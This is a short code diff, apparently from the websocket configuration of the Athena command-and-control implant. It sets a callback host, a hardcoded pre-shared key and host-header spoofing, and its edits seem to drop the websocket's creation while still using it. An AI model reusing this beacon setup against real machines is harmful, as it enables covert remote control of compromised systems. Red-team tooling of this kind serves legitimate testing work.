@@ -54,7 +54,7 @@ namespace Athena.Config
             string callbackHost = "ws://192.168.4.201";
             this.endpoint = "socket";
             string callbackURL = $"{callbackHost}:{callbackPort}/{this.endpoint}";
-            this.userAgent = "USER_AGENT";
+            //this.userAgent = "USER_AGENT";
             this.hostHeader = "%HOSTHEADER%";
             this.psk = "1M1kIlmDATJag0M+MuvYzlq2G+skrS0JT6p5mQkU/d8=";
             this.encryptedExchangeCheck = bool.Parse("false");
@@ -62,9 +62,14 @@ namespace Athena.Config
             {
                 this.crypt = new PSKCrypto(uuid, this.psk);
                 this.encrypted = true;
+
             }
 
-            this.ws = new ClientWebSocket();
+            if (!String.IsNullOrEmpty(this.hostHeader) && this.hostHeader != "%HOSTHEADER%")
+            {
+                this.ws.Options.SetRequestHeader("Host", this.hostHeader);
+            }
+
             Connect(callbackURL);
         }
 
